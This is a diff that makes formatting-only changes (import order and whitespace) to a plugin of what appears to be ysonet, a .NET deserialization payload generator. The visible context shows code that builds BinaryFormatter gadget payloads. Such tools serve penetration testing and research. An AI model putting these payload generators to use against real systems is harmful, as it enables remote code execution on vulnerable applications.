@@ -1,8 +1,8 @@
-﻿using System.Collections.Generic;
-using NDesk.Options;
+﻿using NDesk.Options;
 using System;
-using ysonet.Generators;
+using System.Collections.Generic;
 using System.Transactions;
+using ysonet.Generators;
 using ysonet.Helpers;
 
 /**
@@ -82,7 +82,7 @@ namespace ysonet.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest( "BinaryFormatter", inputArgs);
+            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
             byte[] newSerializedData = new byte[serializedData.Length + 5]; // it has BinaryReader ReadInt32() + 1 additional byte read
             serializedData.CopyTo(newSerializedData, 5);
             newSerializedData[0] = 1;
@@ -103,7 +103,7 @@ namespace ysonet.Plugins
                     Debugging.ShowErrors(inputArgs, err);
                 }
             }
-            
+
 
             return payload;
         }
